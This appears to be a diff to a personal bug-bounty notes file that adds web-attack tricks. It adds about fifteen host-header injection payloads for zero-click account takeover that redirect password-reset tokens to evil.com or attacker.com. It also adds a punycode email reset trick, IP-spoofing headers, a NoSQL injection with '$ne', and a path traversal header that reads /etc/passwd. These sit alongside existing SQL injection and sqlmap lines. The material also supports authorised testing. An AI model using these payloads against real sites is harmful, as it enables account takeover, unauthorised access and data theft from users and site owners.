@@ -10,6 +10,10 @@ sudo virsh shutdown Parrot-OS
 
 [shutdown QEMU]
 
+https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html
+
+[OWASP header]
+
 browser.cache.disk.enable
 
 [reduce firefox lag]
@@ -246,6 +250,16 @@ tar -xvzf juice-shop-9.3.1_node12_linux_x64.tgz
 [+] sudo qemu-img resize /var/lib/libvirt/images/Parrot.qcow2 +20G
 [Image resize]
 
+# FIX virt-manager
+
+[+] GDK_BACKEND=x11 virt-manager --debug
+
+# Tricks
+
+[+] Access control bug bypass based on HTTP header. 
+
+- X-Http-Method-Override: <HTTP-header>
+
 #RECON
 
 [+] https://www.whoxy.com/
@@ -440,8 +454,8 @@ export PATH=$PATH:$GOPATH/bin
 
 - SUBFINDER, ASSEST FINDER OR KNOCKPY [subdomain enum]
 - DIRB, DIRBUSTER, GOBUSTER  OR FEROXBUSTER [dir enum]
-- FFUF [subdomain bruteforce and content discovery]
-- GAU OR KATANA [endpoint crawling]
+- FFUF, WFUZZ [subdomain bruteforce and content discovery]
+- WAYBACK, HAKRAWLER, GAU OR KATANA [endpoint crawling]
 - ARJUN [parameter crawling]
 
 UNION SELECT NULL,NULL,NULL--
@@ -520,6 +534,117 @@ sudo openvpn nmap -sV {target IP}
 
 - If it doesn't work, add <Host: [redacted.com](http://redacted.com) X-Forwarded-Host: [evil.com](http://evil.com)> or invert it < Host: evil.com X-Forwarded-Host: redacted.com>
 - If you receive token from [evil.com](http://evil.com) then try collaborator URL and steal token
+
+[+] Add attackers mail to victims mail in JSON during forgot/reset password action 
+
+[+] X-Custom-IP-Authorization: 127.0.0.1
+
+[+] The `Origin` header to:
+
+```
+https://attacker.com?.redacted.com
+```
+
+# Zero click ATO
+
+> bypasses:
+> 
+
+**1. Add X-Forwarded-Host header**
+
+Host: redacted.com
+
+X-Forwarded-Host: evil.com
+
+**2. Inverted Host Pair**
+
+Host: evil.com
+
+X-Forwarded-Host: redacted.com
+
+**3. XFF Swap**
+
+Host: evil.com
+
+X-Forwarded-For: redacted.com
+
+**4. XFF Flip**
+
+Host: redacted.com
+
+X-Forwarded-For: evil.com
+
+**5. Subdomain Trick 1**
+
+Host: evil.com.redacted.com
+
+**6. Subdomain Trick 2**
+
+Host: redacted.com.evil.com
+
+**7. Typical Host Header Injection Bypass**
+
+POST /endpoint/ HTTP/1.1
+
+Host: [http://evil.com](http://evil.com/)
+
+==> Response: 403, 404
+
+# Bypass:
+
+POST /https://endpoint/ HTTP/1.1
+
+Host: [http://evil.com](http://evil.com/)
+
+==> Response: 200, 302
+
+**8. Burp Headers Edit**
+
+Host: evil.com
+
+X-Forwarded-Host: evil.com
+
+**9. Slash Trick**
+
+Host: evil.com/redacted.com
+
+**10. Query Param Trick**
+
+Host: redacted.com?.evil.com
+
+**11. Unique Trick**
+
+evilredacted.com
+
+**12. Hash Encoding**
+
+evil.com%23@redacted.com
+
+**13. Percent Encoding**
+
+evil.com%25%32%33@redacted.com
+
+**14. Multiple Host Headers**
+
+GET /admin.php HTTP/1.1
+
+Host: redacted.com
+
+Host: attacker.com
+
+**15. Encoded Host Header**
+
+GET /admin.php HTTP/1.1
+
+Host: %74%61%72%67%65%74.com
+
+[+] Use punny code character with email for 0 click
+
+- Add email.com.oastify<or burp collaborator link>
+- Create a punny code email by replacing a character in the mail with a punny code
+- Test if the website treats both the usual email and punny code email as same e.g user already exist
+- Use this to reset password
+- Note — make use of burp browser and replace email on burp intercept or repeater to avoid url encoding email characters
 
 #LFI
 [+] intercept download file and check if file path before endpoint is in '.php?'
@@ -787,6 +912,17 @@ curl -H "Origin: https://malicious.com" -I https://vulnerable-site.com
 
 - Bypass admin portal login with payload as credentials
 
+#No SQL
+
+[+] Test no sql injection vulnerabilities and here's a small tip that you can use to find them too
+
+- If there's a request that looks something like this: http://test.com/api/user?id=12345
+- Try this:
+- http://test.com/api/user?id[$ne]=12345
+- There's a high possibility that you will get more data in the response if the back-end is using no sql database
+
+[+] 
+
 #SQLMAP 
 
 - sqlmap -r login.txt --batch --dbs
@@ -850,7 +986,8 @@ curl -H "Origin: https://malicious.com" -I https://vulnerable-site.com
 - if it doesn't work, double the url encode all character on "/"
 [+] send request to intruder, clear $ signs, add your specific end point to $ sign
 - paste payload in intuder payload and auto start traversal attack --to automate dir/Path traversal
-[+]
+
+[+] Add “X-File-Path: ../../etc/passwd” header
 
 #CSRF
 [+] Copy the element of a user section(email update frame) and paste in file
